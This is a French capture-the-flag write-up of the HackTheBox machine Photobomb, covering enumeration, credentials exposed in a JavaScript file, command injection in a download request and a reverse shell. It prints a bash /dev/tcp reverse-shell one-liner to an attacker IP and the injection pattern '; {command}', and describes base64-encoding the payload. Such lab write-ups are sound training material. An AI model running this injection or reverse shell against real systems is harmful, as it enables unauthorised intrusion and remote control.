# WriteUp de la box Photobomb

Bonjour à toutes et tous, aujourd'hui on s'attaque à la machine Photobomb sur HackTheBox. 

C'est une machine classifiée facile, et nous allons voir que les démarches pour atteindre les deux flags sont relativement rapides (si l'on cherche aux bons endroits).

## Enumération

On commence par réaliser un NMAP afin de scanner les ports ouverts sur la machine : 

![image](https://user-images.githubusercontent.com/33124690/195099486-b77ad55d-e35f-4a74-bfea-d0e4a677d81e.png)

On s'aperçoie que seul le port 80 (HTTP) ainsi que le port 22 (SSH) sont ouverts. On obtient aussi le nom de domaine (photobomb.htb) qu'il faudrait ajouter dans notre ficher "/etc/hosts"

Lorsque l'on se rend sur le site, on se rend compte qu'il n'y a pas grand chose, c'est un site vitrine (d'apparence). 

![image](https://user-images.githubusercontent.com/33124690/195100699-d756413d-d18f-4b08-9fb7-203ba7989aef.png)

Un lien permet de se connecter pour accéder à une autre partie du site. Néanmoins, sans creds, impossible de se connecter, il va falloir trouver une solution. On peut quand même remarquer qu'en cas d'échec d'authentification, on est redirigés sur "/printers".

![image](https://user-images.githubusercontent.com/33124690/195103675-392f6fa7-ed1d-4be0-9de6-2e5de3c0514c.png)

On lance une énumération des "directories" avec gobuster en fond, en parralèle, on continue l'énumération à la main afin de voir si l'on peut trouver quelque chose d'intéressant.

![image](https://user-images.githubusercontent.com/33124690/195105567-1f95810a-096e-415f-9be4-2d3d1354bc33.png)

## Accès au "/printers"

Les résultats de gobuster ne seront pas très intéressants car toutes les pages que l'on trouve nécessite une authentification. Toujours étant qu'en inspectant le code source de la page, on s'aperçoit qu'un fichier JS est utilisé. En y accédant, on obtient des creds visiblement destinés au support technique du site web.

![image](https://user-images.githubusercontent.com/33124690/195106155-64a3d6f0-0ce7-4f7f-aa11-d58bd4662bd9.png)

Il suffit d'utiliser ces creds pour nous connecter ou tout simplement de c/v le lien ! :)

## Reverse Shell pour accéder à la machine

Maintenant que nous avons accès, nous pouvons continuer à énumérer le site. On remarque rapidement un bouton pour télécharger la photo : 

![image](https://user-images.githubusercontent.com/33124690/195107724-663aaefb-0c04-450d-b35c-cfd1a48ce5ee.png)

On lance Burp Suite afin d'étudier la requête qui est effectuée. 

![image](https://user-images.githubusercontent.com/33124690/195108047-908809d1-3394-4012-a25f-12703ab17c57.png)

On test plusieurs attaques comme du LFI sur la requète, rien ne fonctionnait jusqu'au moment où on test les injections de commandes.
Comme on peut le voir ci-contre, il suffit d'ajouter "; {command}" à la suite d'un des trois paramètres pour que ce soit executé.

![image](https://user-images.githubusercontent.com/33124690/195109920-3df43674-442e-49df-9c53-8e26194183dc.png)

Maintenant que nous avons une RCE sur le serveur web, il suffit de créer notre reverse shell et de l'envoyer afin d'avoir accès à la machine.

Dans un premier temps, un simple reverse shell "bash -i >& /dev/tcp/10.10.14.40/4242 0>&1" ne fonctionne pas, même en URL encodant (surement à cause des caractères spéciaux). On décide donc de le passer en base64 en faisant attention de n'avoir aucun "+".

![image](https://user-images.githubusercontent.com/33124690/195110748-47ec7bde-8672-4391-9993-daeaa0c8312a.png)

Puis, on passe notre payload dans la requète.






